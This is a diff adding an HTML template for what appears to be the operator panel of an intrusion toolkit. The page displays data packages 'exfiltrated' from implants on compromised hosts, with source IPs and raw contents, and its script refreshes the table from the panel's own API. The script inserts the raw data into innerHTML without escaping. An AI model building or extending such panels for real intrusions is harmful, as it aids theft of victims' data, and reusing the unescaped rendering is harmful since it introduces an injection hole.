@@ -1,0 +1,77 @@
+<!-- templates/exfil.html -->
+{% extends "base.html" %}
+{% block title %}Exfil Data{% endblock %}
+{% block nav_exfil %}active{% endblock %}
+
+{% block content %}
+<div class="page-header">
+    <h2>📦 Exfiltrated Data</h2>
+    <div class="meta">Raw data packages received from implants</div>
+</div>
+
+<div class="card">
+    <div class="card-header">
+        <div class="card-title">Data Packages</div>
+        <div class="card-subtitle">{{ exfil | length }} entries · auto-refreshed</div>
+    </div>
+    {% if exfil %}
+    <table>
+        <thead>
+            <tr>
+                <th>Timestamp</th>
+                <th>Source IP</th>
+                <th>Size</th>
+                <th>Preview</th>
+                <th>Raw</th>
+            </tr>
+        </thead>
+        <tbody id="exfil-table">
+            {% for e in exfil %}
+            <tr>
+                <td class="mono">{{ e.ts | int }}</td>
+                <td class="mono">{{ e.ip }}</td>
+                <td class="mono">{{ e.data | length }} bytes</td>
+                <td class="mono" style="max-width:300px;overflow:hidden;text-overflow:ellipsis;">
+                    {{ e.data[:64] if e.data else '—' }}
+                </td>
+                <td>
+                    <details>
+                        <summary style="cursor:pointer;color:var(--text-dim);font-size:12px;">View</summary>
+                        <pre>{{ e.data }}</pre>
+                    </details>
+                </td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+    {% else %}
+    <div style="color:var(--text-dim);padding:40px;text-align:center;">
+        No exfil data received yet.
+    </div>
+    {% endif %}
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+async function refreshExfil() {
+    try {
+        const resp = await fetch('/api/exfil');
+        const data = await resp.json();
+        const table = document.getElementById('exfil-table');
+        if (table && data.exfil) {
+            table.innerHTML = data.exfil.map(e => `
+                <tr>
+                    <td class="mono">${e.ts}</td>
+                    <td class="mono">${e.ip}</td>
+                    <td class="mono">${e.data ? e.data.length : 0} bytes</td>
+                    <td class="mono" style="max-width:300px;overflow:hidden;text-overflow:ellipsis;">${e.data ? e.data.slice(0,64) : '—'}</td>
+                    <td><details><summary style="cursor:pointer;color:var(--text-dim);font-size:12px;">View</summary><pre>${e.data}</pre></details></td>
+                </tr>
+            `).join('');
+        }
+    } catch(err) {}
+}
+setInterval(refreshExfil, 15000);
+</script>
+{% endblock %}
